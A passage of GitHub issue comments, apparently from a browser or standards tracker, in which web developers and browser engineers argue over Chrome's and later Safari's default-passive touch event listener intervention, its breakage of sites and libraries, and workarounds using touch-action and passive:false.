A possible way to get perf by default and possibly have the behavior originally intended by the author is to switch from passive to not passive once preventDefault is detected. Yes, it would cause a stutter where it effects scrolling but at least it would restore the sites intended behavior according to the author instead of being just straight up broken according to the author.

Breaking the web, if it's going to speed up a whole bunch of pages, I suppose is acceptable, but we should still doing everything we can to not break pages that rely on certain non-performant web platform features. "
6802	"@mikesherov No: ~2% of the pages have any scrollable areas at all (vertical scroll in those cases), but 100% of them override all touch (and mouse) events to handle scrolling manually for them, as well as providing a horizontal ""page turn"" type effect. As stated earlier in the thread...

The people using preventDefault knew what they were doing - and are the ones who have been badly affected by the change (you might want to read the entire thread again). This ""fix"" is for the sites that have been doing too much in the event handlers and causing the jerky scrolling (and also *not* calling preventDefault - or the collected stats wouldn't have led to the conclusion that this might be a good idea).

""Breaking the web"", especially going against the standards, is not acceptable. It doesn't matter that the intentions were good - it was handled in a seriously short-sighted way (as acknowledged earlier in the thread). You know what would speed up the web even more? Blocking adverts. (Oh wait, I already do that, but I don't have an issue with speed). How about reducing image sizes on smaller screens? (There's already a standard for that - if people follow it). Final option - simply disallow Javascript...

The ""correct"" fix for this is for the people putting together badly coded sites to simply fix them. As we can pretty much guarantee that they won't do that (see earlier in the thread for incentives etc), we've ended up in this mess - which has the obvious conclusion that web developers who need touch events will simply patch Chrome to make it follow the standards again."
6803	"@rycochet I don't get it? Are you for this intervention or against it? I honestly can't tell from your responses.

My point is simply that if we're forced to keep this intervention which breaks the web hard, then perhaps there's a middle ground that breaks it a bit less rather then asking every web dev in the world to go fix sites that were working to their specs for their clients before this intervention."
6804	"@mikesherov Against - though as it's already happened it will be around for several years even if it's reversed, I've simply taken to adding code to everything I do to reverse this change (the first code in this thread to reverse it is a gist posted by me).

The problem with the change is that their sites are still working as per the specs - which now means not working the same in Chrome. The change has literally only affected people following the specs - all the end user will get is either slightly more responsive scroll on some badly coded websites, or broken behaviour on web apps (and some JS libraries). The end users will blame the sites that have been broken rather than Chrome for breaking them, and probably won't notice that touch scrolling is slightly smoother (basic psychology - people notice bad UX, but forget about previous issues when they're not bad any more).

The only other intervention of this magnitude was the ""no synchronous AJAX on the main thread"" - which loudly spammed the console for a long time. As this was for touch events only, and very few developers see a console when debugging on devices, it meant that for the short time there was a warning it got no publicity or visibility by the very people who would have jumped on it before the change was made..."
6805	"@Rycochet 

> all the end user will get is either slightly more responsive scroll on some badly coded websites, or broken behaviour on web apps (and some JS libraries). The end users will blame the sites that have been broken rather than Chrome for breaking them, and probably won't notice that touch scrolling is slightly smoother (basic psychology - people notice bad UX, but forget about previous issues when they're not bad any more).

Exactly. So much for this intervention. This is also what we noticed. On top end devices, Nexus 6P, Samsung S7 etc, you can't tell if the scrolling is any smoother. I guess this solution was aimed at those 2% sites from those 20-30% low end devices. That's pretty low for such a massive intervention. "
6806	"> @rickbias 
> This is exactly what the worst possible outcome the chrome team developers are trying to alleviate. It completely unset the intervention.

Worst for Chrome, maybe. However _best_ for developers that are already performance-aware, but are up against tight deadlines and budget restrictions or have to deal with application architectures that just cannot be refactored to deal with this.

Pardon the rudeness, but as far as I'm concerned that's a matter of ""tough shit"" for Google."
6807	You just broke http://foliotek.github.io/Croppie/. Thanks. 👎
6808	And pinch to zoom on chrome 58.x.x broke. You can't 2-fingers pinch to zoom even on google maps on a chromebook with touch screen. Serve them right! So much for improving user experience when you break things all the time.
6809	@rickbias pinch zoom is fixed see crbug.com/695905. It was broken due to stylus support; completely unrelated to this.
6810	"I hope this is constructive;

I just spent inordinate amounts of time fixing up performance and legacy code on my company's website. Huge overhaul with first-paint and mobile/tablet touch-perf as the kpi. All doc/body listeners gone. All scroll listeners gone. All click events have a counterpart touch event to make it feel good on touch devices, and in webview (no fast-click, all custom). Removed so much conditional browser logic in favour of modern, unified APIs. The perf and responsiveness is great because I cared about it. However, a requirement was to use jQuery and some particular plugins.

Now I need to [add a ""poly-unfill"" to opt-out](https://gist.github.com/Rycochet/6ac0380841debbb65f78d36711a0dafa) of this browser change to make sure the site behaves as expected across devices (_by the way, luckily I was using Safari to demo to my stakeholders the day after 56 dropped!_). Extra bytes, extra maintenance, extra debt. Gonna have to document for future developers why this is important, as well.

eStores with intricate carousel, zoom, and product-display get broken... not to mention delicate product-listing pages with touch-scroll handlers... A customer is going to have trouble making up their mind to buy something if they're getting sick/dizzy by messed up touch interactions while inspective the details! That's potential bottom-line damage, and it's people like me who get 💩'd on because of it.

eStores rely on libraries (jQuery for example) that are ancient, and vendor code... how on earth do you expect a small dev team to fix this kind of stuff when they have dependencies on those ancient javascript libraries, and barely-supported plugins for aforementioned carousels, zooms, etc? Please forgive me if I'm wrong, but in most scenarios (~80% of the top million sites use jQuery) there's absolutely no possible way for a developer to set passive to false without @Rycochet's poly-unfill, or something similar?

**With evergreen power, comes evergreen responsibility!**

Just my penny's worth.
Apologies if I shouldn't have left this here.

_The emails I will get with: ""WHY IS THIS BROKEN?""... 😞  __It's embarrassing.___"
6811	"> Please forgive me if I'm wrong, but in most scenarios (~80% of the top million sites use jQuery) there's absolutely no possible way for a developer to set passive to false without @Rycochet's poly-unfill, or something similar?

You're right; there is not. That's one of the major issues with this type of broken intervention that Google's engineers casually stepped over. Their proposed solution to that predicament amounts to a meme-tastic ""patch all the libraries!""
"
6812	@simeydotme Can you elaborate why touch-action didn't work for your jquery plugins? Is the site externally visible?
6813	@simeydotme it looks like Google engineers are trying to tell us to take control of our own javascript libraries. Stop relying on jQuery. Start to give a damn on user experience. Ahem, and taking care of the experience on slow android devices. As developers that taking the advantage of the platform born from the hard work of Google engineers, we got to pay our shares. It doesn't seem that they are going to revert this intervention anytime soon. Good luck.
6814	"@rickbias @simeydotme touch-action is a CSS property and is very applicable to sites that are using jquery. You don't need a way to set passive: false provided you set the correct touch-action for the behaviour you want on the elements targeted. The question is whether touch-action describes the behaviour you want adequately. We know there are some deficiencies in the touch-action definition and want to be educated about the cases where touch-action doesn't work for them.

I hope that see my involvement here shows we do care about issues web developers face. "
6815	"thanks @dtapuska for the response! :)
I will do my best to see if the css properties can help in my current scenarios. But I am not confident, And I really appreciate the time taken to feedback to individual comments. I can't imagine the amount of fires that need to be put out :P

I am not able to give immediate response about the viability of css touch properties, but upon reading https://developers.google.com/web/updates/2016/10/pointer-events quite carefully, its a little misleading as to what I really need to do. In my most pressing scenario I have a standard-ish carousel of product images that needs to block users vertically scrolling the page while it's being interacted with. That's default functionality which seems to be broken in chrome. Not only that; I am using native pinch-zoom to allow users to view the details of the images at will (on trackpad/screen), and finally I need to capture touchend/click to allow user to throw the image into a full-screen modal on larger viewports. But this is supposed to work flawlessly across device/screen. And of course I don't have the capability, or time, to remove libraries and write my own carousel. 

Currently I haven't had a chance to properly investigate the chrome56 UX on touch-screen laptops, or android tablets. but while I have my devtools emulator open, I'm witnessing thousands of warnings in my console during normal use :( You'll understand aswell that I have this on internal testing servers right now, so not able to share.

I will come back as soon as possible with my results. And see if my findings can help others :) I didn't mean to ask for help/troubleshooting here, I wanted to express the thoughts of a slightly-privileged developer who builds things to get paid, and who's life is affected by things like this -- the feeling I had trouble describing in my previous comment was: In one way, it feels like all the corners that other developers and organisations have cut in perf/ux for their customers have been justified, and I got screwed for it. :/"
6816	"> Note that for over a year, the click delay has been essentially gone from the latest version of all major browsers, and for years before popular libraries like fastlick.js would disable themselves in Chrome/Firefox on mobile pages known not to have a click delay. Listening to touchend universally to avoid the legacy click delay is now pretty much an anti-pattern (as it causes a number of other problems).

Side point: True for the click event but there is still a discrepancy between `touchstart` and the CSS `:hover` state being activated - I made a [library](https://github.com/marcoms/quicktap) to get around it"
6817	I tried installing my custom pi-hole DNS, which blocks a lot of ads content (Google ads included), I can totally tell that it improves scrolling performance a lot. Sites load fast. Content is almost always immediately scrollable. Maybe chrome team should consider some kind of content blocker for chrome browser.
6818	Maybe people can ditch Chrome and start using Brave.
6819	I tried Brave, it is great. I don't mind paying for this browser if it can save my mobile data usage and improve my web browser experience a lot. I don't have to wait for ads to load.
6820	Looks like the people responsible for this bug are quietly hoping it'll go away, so pinging a reminder about how badly they screwed over countless thousands of sites instead of telling the few badly behaved sites to fix their crap...
6821	Sorry but our data indicates that the result was the opposite.  We improved the performance on a vast swath of the mobile web while causing problems for a very small number of developers/sites and virtually no users (we've heard almost no complaints from users about broken sites).  Our data suggests we made the right trade-off for the web platform as a whole and for Chrome as a product. I understand that your perspective is the opposite and I'm sorry about that - I really wish there was a way to make everyone happy, that's just not reality. The ultimate test will be what all browsers do in the long run (or at least all of those that care about scroll performance on low-end touch devices).
6822	"You've already proved that your data was far from complete, so that's always going to be a non-issue.

I really haven't got a clue where your idea that users would know to complain to you lot comes from - even developers need to jump through hoops to actually find this issue on here (go on, it's really easy to create a page that breaks because of this - give it to someone who is a normal user, then see how many years it takes them to find this).

Considering that I found one issue just this week where the Chrome devs contacted webmasters because of their sites behaving badly (rather than actually ending up with an intervention of some sort), and that this bug is still nowhere near being part of the standard - it's an issue that needs to keep being addressed until either it's fixed to match the standard, or the standard is fixed to match this..."
6823	"Note that I'm an editor of the standard here ([Touch Events](https://w3c.github.io/touch-events/)), I could probably change it to match Chrome now.  But that's not the right focus, the right focus is implementation consensus.  When another browser follows (and, based on the long conversations I've had with the relevant engineers, I do believe it's just a matter of ""when"") then we'll reflect that by updating the standard."
6824	It's a breaking change, so why not get it into a proposed standards change so they've got something to work towards? It's still going to be 3+ years before coding without a polyfill to fix it will be standard (when relevant) simply because of how long we need to support older browsers, but it'll be a start...
6825	It is [already a proposed standards change](https://github.com/w3c/touch-events/issues/74).  Note that the issue was filed by the DOM expert at Mozilla, so it's not like the standards/browser community isn't talking seriously amongst ourselves about the right path forward here...
6826	"That's the same discussion as before, having had no further input nor discussion since March - saying that conversations with engineers are leading towards it is absolutely and completely useless - without public discussion nothing is going to change or move forward (or even reverting things - which would be a non-breaking change at least).

The arguments for this change are still built on broken data - not saying that it's a bad choice (though I'll class it as a bug until the specs change) and does need to be chased up on regularly until something changes - so hopefully this will push it a little :-)"
6827	"![Youtube](https://user-images.githubusercontent.com/2817396/27242420-acf12e92-530f-11e7-943b-1cd09b47a2be.png) 

The Chrome Devtools Console should be renamed to the ""Violation Dump""
QA teams questioning all the ""violations"", and I've noticed absolutely no improvement to my websites, or the websites I visit daily :/

"
6828	"Just of note, as Edge still shows no signs of supporting the `options` parameter on `addEventListener` you still need to do browser / [feature ](https://github.com/WICG/EventListenerOptions/blob/gh-pages/explainer.md#feature-detection) detection (and since IE will be around for many years that's unlikely to change this decade).

Typescript also only added support for the `options` parameter in 2.3.1 (https://github.com/Microsoft/TypeScript/issues/14188) - so any code from before then would have had to override the argument type to use it."
6829	"> Just of note, as Edge still shows no signs of supporting the options parameter on addEventListeneR

We've been shipping this in our insider build for a couple months. Should be in the next stable releaee"
6830	@patrickkettner Awesome! :-)   Do you know (or can you say) if Edge is adding the passive default value for touch listeners?
6831	"Yep, you can follow along on the edge status dashboard

> On Jun 19, 2017, at 4:21 PM, Rycochet <notifications@github.com> wrote:
> 
> @patrickkettner Awesome! :-) Do you know (or can you say) if Edge is adding the passive default value for touch listeners?
> 
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub, or mute the thread.
> 
"
6832	"In which case - anyone from the Mozilla / Firefox dev teams want to weigh in on here and have all the major browsers doing the same thing so this can get put into the standards and the whole issue closed?

(Just to say, that won't help the thousands of sites that have been broken by this and won't get updated, but will at least get things moving in the future, even if it is just overriding the option by default)."
6833	"I've noticed that the Verbose warning about passive listeners now turns up on all touch events in Chrome - which results in hundreds of thousands of (normally hidden) warnings before the tab crashes -

```
[Violation] Added non-passive event listener to a scroll-blocking 'touchstart' event. Consider marking event handler as 'passive' to make the page more responsive.
```

![image](https://user-images.githubusercontent.com/290714/28663146-664cca18-72b4-11e7-87b4-9851a9ad51f4.png)

When the event specifically has `{passive:false}` added to it then it's a pretty good indication that is not possible. Adding specific CSS to say it won't scroll is not possible as the decision to scroll is made in Javascript on the event itself.

While I still hope that the standards change to fix this bug, these warnings are worse than useless with the sheer amount of spam appearing on even the simplest of web apps..."
6834	"      <a
          href=""tel:+xxxxxxxxxx""
        >CALL 6514 9729
      </a>
this code is printing this error on mobile view !

[Intervention] Unable to preventDefault inside passive event listener due to target being treated as passive. See https://www.chromestatus.com/features/5093566007214080"
6835	"Starting in iOS 11.3 beta, iOS Safari is shipping with a version of WebKit that defaults touchstart and touchmove event listeners on body, document and window to passive.

Unfortunately, WebKit does not support `touch-action: none`, so anyone who is relying on that to avoid this intervention will need to apply a second workaround, namely to bind the event with `{passive: false}` and use `preventDefault`.

https://bugs.webkit.org/show_bug.cgi?id=175346
https://bugs.webkit.org/show_bug.cgi?id=175869
https://bugs.webkit.org/show_bug.cgi?id=182521"
6836	"@jfirebaugh 

I've been waiting for something like this to happen for over a year now. That Apple would at one point copy Google's intervention was a given. That they'd do it without first implementing `touch-action` is hilarious, and also not entirely unexpected - given their track-record of launching broken or breaking web features.

Wonder what the ""You just need to add `touch-action:none` to fix it""-crowd is going to say now."
6837	"Yeah this is unfortunate.  I'm asking Apple to reconsider shipping the intervention [here](https://bugs.webkit.org/show_bug.cgi?id=182521#c8).

> Wonder what the ""You just need to add touch-action:none to fix it""-crowd is going to say now.

The ""right"" thing to say would be to show the ~20 lines of code necessary to properly feature detect touch-action and EventListenerOptions to set `passive:false` when the latter is supported without the former.  But even I don't believe most people are likely to do that (or at least, those that are don't need my help showing how to do it).  Despite the drawbacks, perhaps we should just encourage the simple one-line UserAgent check to ensure Safari always gets `passive:false` (regardless of whether they support touch-action in the future)?"
6838	"@RByers 

If you're talking a one-size-fits-all cure-all patch that can be injected from author-land, _and_ which respects the intervention (rather than nuke it altogether by forcing `passive:false` as a universal default) ---

then I think you should detect support for the `touch-action` CSS property, rather than sniff for Safari's UA. 

For any browsers that does not support `touch-action`, you'd want the sane default to be the 'oldskool' behavior.

Conversely any browser which does support `touch-action` can set its interactions up properly with that.
Well; usually anyway.

Luckily, for the really complicated edge cases where `passive:false` is absolutely necessary, such a polyfill would still patch `addEventListener` to universally accept `EventListenerOptions` arguments. It would just silently drop the `passive` flag and translate the `capture` flag to a boolean argument when `EventListenerOptions` are not supported. No harm done.

"
6839	"> But even I don't believe most people are likely to do that

From the perspective of a web developer responsible for a widely deployed library that has been broken _twice_ now by this intervention: no, they aren't. The next version of Mapbox GL JS will be forcing `passive: false` and preventing default when it needs to, performance be damned. I expect other affected developers will do the same. This whole episode has been extremely frustrating from beginning to end, and I will do whatever it takes to prevent my software being broken again, even if that doesn't have ideal performance characteristics. Keeping my software _actually functioning_ will always take precedence over performance, and the browser vendors have been quite inconsiderate of my needs, so I don't see any reason to bend over backwards with a bunch of feature detection, especially given that a previously-recommended solution has now been broken by a subsequent browser release.

@RByers: I know you have lots of metrics supposedly showing the advantages of this intervention. How are you measuring the costs? I see little or no consideration or discussion of costs in the [metrics doc](https://docs.google.com/document/d/10O_wMEpKgnhCfEQ8L3JckEKvkcclwEwCLtL0nSl7usA/edit#) or [blog post](https://developers.google.com/web/updates/2017/01/scrolling-intervention). However, between this issue, [the blog post comments](https://developers.google.com/web/updates/2017/01/scrolling-intervention), [this issue](https://bugs.chromium.org/p/chromium/issues/detail?id=639227), and various other venues, there are probably hundreds of developers responding negatively to this intervention. Do you weigh that response in your decision at all? Is there any amount of developer anti-goodwill that would convince you that an intervention is a bad idea?

I've tried to keep this comment civil, but I have to admit it has been difficult. I'm _really pissed_ at the decisions the Chrome and WebKit teams have made on this issue. I hope they reflect on the real difficulties and frustrations this intervention created for developers and end users, and reconsider making similar breaking changes to the web in the future."
6840	"PSA to fellow developers trying to clean up after this -- WebKit has several related bugs that you'll _also_ need to work around:

* https://bugs.webkit.org/show_bug.cgi?id=184250
* https://bugs.webkit.org/show_bug.cgi?id=184251"
6841	"Haha, I guess things really are cyclical :) perhaps Chrome should have multiple ""rendering modes"" – one that follows web standards, and another with potentially breaking interventions... and we can call the latter ""quirks mode"" for fun.

But seriously, it's not lost on me that a *major* reason for jQuery's ubiquity is that it unified the behavior of browsers, which had subtle differences in the way they approached features like event propagation."
